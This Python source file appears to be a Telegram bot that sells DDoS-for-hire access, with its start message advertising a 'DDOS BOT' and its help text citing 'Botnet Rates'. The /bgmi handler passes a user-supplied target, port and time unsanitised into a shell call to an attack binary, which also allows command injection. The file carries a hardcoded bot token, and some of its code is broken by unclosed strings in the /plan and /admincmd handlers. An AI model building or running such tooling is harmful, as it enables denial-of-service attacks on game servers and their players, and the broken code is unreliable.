admin_id = [1099673604]   # ✅ integer, no quotes
import telebot
import subprocess
import datetime
import os

# ===== GLOBAL STATE =====
DEV_MODE = False

bgmi_running = False  # tracks if bgmi is running
bgmi_process = None   # stores subprocess handle
bgmi_cooldown = {}    # user_id -> last command time
COOLDOWN_TIME = 10    # seconds

# insert your Telegram bot token here
bot = telebot.TeleBot('7844122825:AAGdzw7l_GZ1IL5QAVuUnQNsaGftq-uzYKI')

# File to store allowed user IDs
USER_FILE = "users.txt" 

# File to store command logs

LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = message.from_user.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- @shinoj_zakky."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = message.from_user.id
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = message.from_user.id

    # Admin check
    if user_id not in admin_id:
        bot.reply_to(
            message,
            "You have not purchased yet, purchase now from:- @shinoj_zakky 🙇"
        )
        return

    command = message.text.split()

    if len(command) < 2:
        bot.reply_to(
            message,
            "Please Specify A User ID to Remove.\nUsage: /remove <userid>"
        )
        return

    user_to_remove = command[1]

    if user_to_remove in allowed_user_ids:
        allowed_user_ids.remove(user_to_remove)

        with open(USER_FILE, "w") as file:
            for uid in allowed_user_ids:
                file.write(f"{uid}\n")

        response = f"User {user_to_remove} removed successfully 👍."
    else:
        response = f"User {user_to_remove} not found in the list ❌."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = message.from_user.id

    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                content = file.read()
                if content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    allowed_user_ids.clear()
                    response = "Users cleared successfully ✅"
        except FileNotFoundError:
            response = "Users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @shinoj_zakky 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = message.from_user.id

    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()

            if user_ids:
                response = "Authorized Users:\n"
                for uid in user_ids:
                    try:
                        user_info = bot.get_chat(int(uid))
                        username = user_info.username
                        response += f"- @{username} (ID: {uid})\n"
                    except Exception:
                        response += f"- User ID: {uid}\n"
            else:
                response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = (
            "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ "
            "ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ "
            "ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ."
        )

    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = message.from_user.id
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙏𝙝𝙞𝙨 𝘽𝙤𝙩 𝙞𝙨 𝙤𝙣𝙡𝙮 𝙛𝙤𝙧 𝙥𝙖𝙞𝙙 𝙪𝙨𝙚𝙧𝙨 𝙗𝙪𝙮 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 - @vshinoj_zakky "
        bot.reply_to(message, response)


# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = (
        f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🔥🔥\n\n"
        f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n"
        f"𝐏𝐨𝐫𝐭: {port}\n"
        f"𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
        f"𝐌𝐞𝐭𝐡𝐨𝐝: VIP - @shinoj_zakky"
    )

    bot.reply_to(message, response)

# Cooldown storage
bgmi_cooldown = {}
COOLDOWN_TIME = 10  # seconds


@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global bgmi_running, bgmi_process   # ✅ MUST BE FIRST LINE

    user_id = message.from_user.id
    user_id_str = str(user_id)

    # Authorization check
    if user_id not in admin_id and user_id_str not in allowed_user_ids:
        bot.reply_to(message, "🚫 Unauthorized Access!")
        return

    # Cooldown (admins bypass)
    if user_id not in admin_id:
        if user_id in bgmi_cooldown:
            elapsed = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
            if elapsed < COOLDOWN_TIME:
                bot.reply_to(
                    message,
                    f"Cooldown ❌ Wait {COOLDOWN_TIME - elapsed}s"
                )
                return
        bgmi_cooldown[user_id] = datetime.datetime.now()

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
        return

    target = command[1]

    try:
        port = int(command[2])
        duration = int(command[3])
    except ValueError:
        bot.reply_to(message, "Port & time must be numbers ❌")
        return

    if duration > 600:
        bot.reply_to(message, "Time must be < 600 ❌")
        return

    full_command = f"./bgmi {target} {port} {duration} 500"

    # ===== EXECUTION =====
    record_command_logs(user_id, '/bgmi', target, port, duration)
    log_command(user_id, target, port, duration)
    start_attack_reply(message, target, port, duration)

    if DEV_MODE:
        print("[DEV MODE] Skipped:", full_command)
        bgmi_running = True
        bgmi_process = None
    else:
        bgmi_process = subprocess.Popen(full_command, shell=True)
        bgmi_running = True

    bot.reply_to(message, "✅ BGMI command executed")

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = message.from_user.id
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡 shinoj_zakky."

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['stopbgmi'])
def stop_bgmi(message):
    global bgmi_running, bgmi_process

    if message.from_user.id not in admin_id:
        bot.reply_to(message, "🚫 Unauthorized Access!")
        return

    if not bgmi_running:
        bot.reply_to(message, "ℹ️ bgmi is not running.")
        return

    if not DEV_MODE and bgmi_process:
        bgmi_process.terminate()

    bgmi_process = None
    bgmi_running = False
    bot.reply_to(message, "🛑 bgmi stopped successfully.")
    
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
 /bgmi : Method For Bgmi Servers. 
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.
 /myinfo : TO Check Your WHOLE INFO.
 /stoppp : to stop Attacks.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @shinoj_zakky
Official Channel :- shinoj_zakky
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 {user_name} 𝗧𝗢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗢𝗧 𝗕𝗬 𝗩𝗘𝗡𝗢𝗠 𝗧𝗛𝗜𝗦 𝗜𝗦 𝗛𝗜𝗚𝗛 𝗤𝗨𝗔𝗟𝗜𝗧𝗬 𝗦𝗘𝗥𝗩𝗘𝗥 𝗕𝗔𝗦𝗘𝗗 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐥𝐢𝐦𝐢𝐭~ 10𝐦𝐢𝐧𝐮𝐭𝐞𝐬 .
🤖𝗧𝗿𝘆 𝗧𝗼 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : /help 
✅BUY :- shinoj_zakky'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many !! Cause A Ban From Bot
2. Dont Run 2 At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED shinoj_zakky OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f"{user_name}, Admin Commands Are Here!!:"

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙪𝙨𝙚𝙧𝙨 𝙛𝙧𝙤𝙢 𝗩𝗘𝗡𝗢𝗠:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
